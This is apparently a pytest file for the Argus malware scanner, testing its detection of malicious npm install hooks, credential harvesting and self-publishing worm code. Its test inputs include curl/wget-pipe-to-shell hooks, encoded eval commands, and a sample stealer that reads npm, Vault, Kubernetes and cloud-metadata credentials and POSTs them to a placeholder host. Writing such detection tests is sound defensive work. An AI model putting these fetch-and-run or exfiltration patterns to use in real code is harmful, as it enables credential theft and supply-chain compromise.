"""Worm-style supply-chain malware checks (#134, #135, #136).

Samples are written for these tests; none is real malware. Suspicious literals are assembled
from pieces (J(...)) so that this test file itself doesn't trip Argus's own scan of the repo.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from argus.models import Severity
from argus.tools import supply_chain_checks as sc
from argus.tools.malware import run_malware_scan


def J(*parts: str) -> str:
    return "".join(parts)


def _hooks(**scripts: str) -> str:
    return json.dumps({"name": "pkg", "version": "1.0.0", "scripts": scripts}, indent=2)


def _lifecycle(**scripts: str) -> dict[str, tuple[str, Severity]]:
    findings = sc.lifecycle_script_findings(_hooks(**scripts), "package.json")
    return {f.rule_id: (f.confidence, f.severity) for f in findings}


# ── #134 install hooks ─────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    ("hook", "command", "rule"),
    [
        (
            "postinstall",
            J("cu", "rl -s https://x.example/p.sh | sh"),
            "malware-npm-install-download-exec",
        ),
        (
            "preinstall",
            J("wg", "et -qO- https://x.example/a | bash"),
            "malware-npm-install-download-exec",
        ),
        (
            "install",
            J("wg", "et https://x.example/b -O b && chmod +x b && ./b"),
            "malware-npm-install-download-exec",
        ),
        (
            "postinstall",
            "node -e \"require('child_process').exec(process.env.X)\"",
            "malware-npm-install-inline-code",
        ),
        ("preinstall", "python3 -c 'import os'", "malware-npm-install-inline-code"),
        ("postinstall", J("ev", 'al "$(cat x)"'), "malware-npm-install-inline-code"),
        ("postinstall", J("echo aGVsbG8= | base", "64 -d > x"), "malware-npm-install-encoded"),
        (
            "prepare",
            "node -e \"eval(Buffer.from(p,'base64').toString())\"",
            "malware-npm-install-encoded",
        ),
    ],
)
def test_dangerous_install_hooks_are_high(hook: str, command: str, rule: str) -> None:
    found = _lifecycle(**{hook: command})
    assert rule in found
    assert found[rule][1] == Severity.HIGH


@pytest.mark.parametrize(
    ("command", "rule"),
    [
        ("node bundle.js", "malware-npm-install-runs-file"),
        ("node ./scripts/setup.js", "malware-npm-install-runs-file"),
        ("sh install.sh", "malware-npm-install-runs-file"),
        # "eval" in a file name is not shell eval
        ("node scripts/eval-setup.js", "malware-npm-install-runs-file"),
        (J("cu", "rl -O https://x.example/bin.tgz"), "malware-npm-install-downloads"),
    ],
)
def test_review_install_hooks_are_medium_and_low_confidence(command: str, rule: str) -> None:
    found = _lifecycle(postinstall=command)
    assert found == {rule: ("low", Severity.MEDIUM)}


@pytest.mark.parametrize(
    "scripts",
    [
        {"prepare": "husky"},
        {"prepare": "husky install"},
        {"postinstall": "patch-package"},
        {"prepare": "npm run build", "build": "tsc -p ."},
        {"prepare": "tsc"},
        {"postinstall": "prisma generate"},
        {"install": "node-gyp rebuild"},
        {"postinstall": "electron-builder install-app-deps"},
        {"prepare": "svelte-kit sync"},
        {"build": J("cu", "rl -s https://x.example/p.sh | sh")},  # not an install hook
    ],
)
def test_ordinary_install_hooks_are_not_flagged(scripts: dict[str, str]) -> None:
    assert _lifecycle(**scripts) == {}


def test_a_hook_cannot_hide_behind_npm_run() -> None:
    found = _lifecycle(postinstall="npm run setup", setup=J("cu", "rl -s https://x.example | sh"))
    assert "malware-npm-install-download-exec" in found


def test_hook_finding_points_at_the_hook_line() -> None:
    text = _hooks(test="vitest", postinstall=J("cu", "rl -s https://x.example | sh"))
    (finding,) = sc.lifecycle_script_findings(text, "package.json")
    assert text.splitlines()[finding.line - 1].strip().startswith('"postinstall"')


def test_package_json_walk_skips_node_modules(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text("{}")
    (tmp_path / "packages" / "a").mkdir(parents=True)
    (tmp_path / "packages" / "a" / "package.json").write_text("{}")
    (tmp_path / "node_modules" / "dep").mkdir(parents=True)
    (tmp_path / "node_modules" / "dep" / "package.json").write_text("{}")
    found = {p.relative_to(tmp_path).as_posix() for p in sc.iter_package_json(tmp_path)}
    assert found == {"package.json", "packages/a/package.json"}


# ── #135 credential harvesting ─────────────────────────────────────────────────

NPMRC = J("~/.npm", "rc")
METADATA = J("http://169.254.", "169.254/latest/meta-data/iam/security-credentials/")
VAULT = J("VAULT_", "TOKEN")
KUBE = J("~/.kube/", "config")
GH = J("GITHUB_", "TOKEN")
NPMT = J("NPM_", "TOKEN")

STEALER = f"""
const fs = require('fs');
const npm = fs.readFileSync(require('os').homedir() + '/{NPMRC[2:]}', 'utf8');
const vault = process.env.{VAULT};
const kube = fs.readFileSync('{KUBE}');
const creds = await (await fetch('{METADATA}')).text();
await fetch('https://collector.example/u', {{ method: 'POST', body: JSON.stringify({{ npm, vault, kube, creds }}) }});
"""


def test_chaindrop_style_stealer_is_flagged() -> None:
    (finding,) = sc.credential_harvest_findings(STEALER, "lib/telemetry.js")
    assert finding.rule_id == "malware-credential-harvesting"
    assert finding.severity == Severity.HIGH
    for label in ("npm token", "Vault token", "Kubernetes credentials", "cloud metadata"):
        assert label in finding.title


def test_publish_cli_reading_only_npmrc_is_not_flagged() -> None:
    cli = f"const rc = fs.readFileSync(home + '/{NPMRC[2:]}');\nawait fetch(registry, {{ headers }});\n"
    assert sc.credential_harvest_findings(cli, "src/cli.js") == []


def test_release_script_with_npm_and_github_tokens_is_not_flagged() -> None:
    script = f"const a = process.env.{NPMT};\nconst b = process.env.{GH};\nawait fetch(api);\n"
    # Two "registry" tokens without any machine credential: normal for release tooling.
    assert sc.credential_harvest_findings(script, "src/notify.js") == []
    # And anything under release tooling is skipped entirely.
    assert sc.credential_harvest_findings(STEALER, "scripts/release.js") == []
    assert sc.credential_harvest_findings(STEALER, ".github/actions/x/index.js") == []


def test_credentials_without_a_network_call_are_not_flagged() -> None:
    reader = f"const v = process.env.{VAULT};\nconst k = fs.readFileSync('{KUBE}');\n"
    assert sc.credential_harvest_findings(reader, "src/config.js") == []


# ── #136 self-propagation ──────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "code",
    [
        J("execSync('npm pub", "lish --access public', { cwd: dir });"),
        J("spawnSync('npm', ['pub", "lish'], { cwd });"),
        J("subprocess.run(['twine', 'up", "load', 'dist/*'])"),
        J("os.system('python -m tw", "ine up", "load dist/*')"),
        J("await execa('pnpm', ['pub", "lish', '--no-git-checks']);"),
    ],
)
def test_publishing_from_package_code_is_flagged(code: str) -> None:
    ids = [f.rule_id for f in sc.self_propagation_findings(code + "\n", "lib/index.js")]
    assert ids == ["malware-publish-from-code"]


@pytest.mark.parametrize(
    "code",
    [
        J("fetch('https://registry.npmjs.org/-/v1/search?text=main", "tainer:' + user)"),
        J("fetch(`https://registry.npmjs.org/-/user/${u}/pack", "age`)"),
    ],
)
def test_maintainer_enumeration_is_flagged(code: str) -> None:
    ids = [f.rule_id for f in sc.self_propagation_findings(code + "\n", "lib/index.js")]
    assert ids == ["malware-npm-maintainer-enumeration"]


@pytest.mark.parametrize(
    ("code", "path"),
    [
        (J("execSync('npm pub", "lish')"), "scripts/release.js"),
        (J("execSync('npm pub", "lish')"), "publish/index.js"),
        (J("execSync('npm pub", "lish')"), ".github/scripts/ship.js"),
        ("// run `npm publish` after tagging", "src/docs.js"),
        ("const url = 'https://registry.npmjs.org/react';", "src/info.js"),
    ],
)
def test_release_tooling_comments_and_package_lookups_are_not_flagged(code: str, path: str) -> None:
    assert sc.self_propagation_findings(code + "\n", path) == []


# ── wired into the malware scan ────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_malware_scan_runs_the_new_checks(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(_hooks(postinstall='node -e "x()"'))
    (tmp_path / "lib").mkdir()
    (tmp_path / "lib" / "a.js").write_text(STEALER)
    (tmp_path / "lib" / "b.js").write_text(J("execSync('npm pub", "lish')\n"))
    result = await run_malware_scan(str(tmp_path))
    ids = {f.rule_id for f in result.findings}
    assert {
        "malware-npm-install-inline-code",
        "malware-credential-harvesting",
        "malware-publish-from-code",
        "malware-cloud-metadata-access",
    } <= ids
    assert result.errors == []
